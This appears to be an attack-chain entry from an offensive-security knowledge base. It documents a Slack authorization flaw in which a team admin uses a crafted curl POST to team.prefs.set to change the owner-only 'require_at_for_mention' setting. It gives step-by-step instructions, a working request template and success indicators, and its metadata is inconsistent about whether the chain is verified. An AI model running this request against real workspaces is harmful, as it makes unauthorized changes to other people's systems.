---
id: 61e16c03-b50e-4675-8a5f-1425caf7ba49
name: Slack Privilege Escalation via Unauthorized Team Preference Modification
type: attack_chain
description: >-
  A privilege escalation vulnerability in Slack's API allowing team admins to
  modify owner-restricted team settings, such as 'require_at_for_mention', via a
  crafted POST request.
verified: false
submitted: true
step_count: 2
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.688Z'
procedures:
  - '[[procedures/Exploit-Slack-Team-Prefs-API-Privilege-Escalation]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
tactics:
  - '[[Privilege Escalation]]'
tags:
  - privilege-escalation
  - slack
  - api
  - authorization-bypass
platforms:
  - Web
tools: []
complexity: medium
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---

# Slack Privilege Escalation via Unauthorized Team Preference Modification

Multi-stage attack chain demonstrating a complete attack workflow exploiting a privilege escalation in Slack's team preferences API.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Authenticate as Team Admin] --> B[Modify Team Preferences]
    B --> C[Escalated Privileges Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser or API client (e.g., curl)

### Target Environment

- Slack workspace with API access
- Web platform
- Services: Slack API

### Initial Access Requirements

- Valid team admin credentials
- Network access to Slack domain (e.g., *.slack.com)
- No prior owner privileges required

## Detailed Attack Procedures

### Step 1: Authenticate as Team Admin
procedure: [[procedures/Exploit-Slack-Team-Prefs-API-Privilege-Escalation]]

**Objective**: Obtain a valid session token as a team admin to enable API requests.

**Instructions**: Log in to the Slack workspace using team admin credentials via the web interface or API to acquire the authentication token (e.g., xoxs- prefixed token).

**Expected Output**: Successful login with access to admin settings and a valid token in browser cookies or API response.

**Success Indicators**:
- Admin dashboard accessible
- Token captured (e.g., via browser dev tools)

### Step 2: Send Crafted POST Request to Modify Setting
procedure: [[procedures/Exploit-Slack-Team-Prefs-API-Privilege-Escalation]]

**Objective**: Exploit the lack of authorization checks to change the owner-restricted 'require_at_for_mention' setting to true, escalating admin privileges.

**Instructions**: Use the admin token to send a POST request to /api/team.prefs.set with the crafted prefs payload. Execute using [[commands/slack-set-team-prefs-post]]:

```bash
curl -X POST "https://example.slack.com/api/team.prefs.set?t=1423143830" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "Referer: https://example.slack.com/admin/settings" \
  -H "Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=..." \
  -d "prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1"
```

Replace placeholders like domain, token, and cookie values with actual ones from Step 1.

**Expected Output**: JSON response with {"ok":true}, confirming the setting change.

**Success Indicators**:
- Setting modified successfully
- Verify in Slack admin settings that 'require_at_for_mention' is now true

## Attack Chain Summary

### Key Achievements

1. Bypassed owner-only restrictions using admin token
2. Unauthorized modification of team-wide preferences
3. Potential disruption to team communication and escalated control

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]]

### MITRE ATT&CK Tactics

- [[Privilege Escalation]]

---
*Last updated: 2023-10-01T00:00:00Z*
